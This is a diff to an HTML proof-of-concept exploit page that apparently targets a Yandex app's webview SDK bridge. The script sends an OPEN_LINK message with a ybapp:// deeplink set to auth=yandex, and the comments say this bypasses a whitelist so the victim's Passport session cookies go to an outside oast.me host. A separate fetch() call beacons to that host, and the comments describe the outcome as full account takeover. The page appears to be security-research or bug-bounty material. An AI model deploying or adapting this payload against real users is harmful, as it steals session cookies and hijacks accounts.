@@ -1,13 +1,15 @@
 <html><head><title>PoC</title></head>
 <body>
 <script>
-// CRITICAL: Open attacker URL via /open_web deeplink with auth=yandex
-// This should INJECT Yandex passport cookies into the webview before loading our URL
-// Our server will receive the request WITH the user's session cookies
+// CRITICAL: Passport cookie theft via deeplink injection
+// 1. OPEN_LINK with urlType:DEEPLINK passes z13=true (whitelist bypass)
+// 2. ybapp://screen.open/open_web?url=ATTACKER&auth=yandex injects cookies
+// 3. WebView loads our URL WITH victim's Yandex Passport session cookies
+// 4. Cookies sent to attacker server = full account takeover
 
 window.__plusSDKMobileCompat.onMessage(JSON.stringify({
   type: "OPEN_LINK",
-  trackId: "cookie-steal",
+  trackId: "ato",
   payload: {
     url: "ybapp://screen.open/open_web?url=https%3A%2F%2Fda7db8p9tmut9738sbb0r4setdbsf769t.oast.me%2Fcookie-steal&auth=yandex&control=none",
     urlType: "DEEPLINK",
@@ -16,7 +18,7 @@ window.__plusSDKMobileCompat.onMessage(JSON.stringify({
   }
 }));
 
-fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/cookie-steal-sent");
+fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/ato-sent");
 </script>
 </body>
 </html>
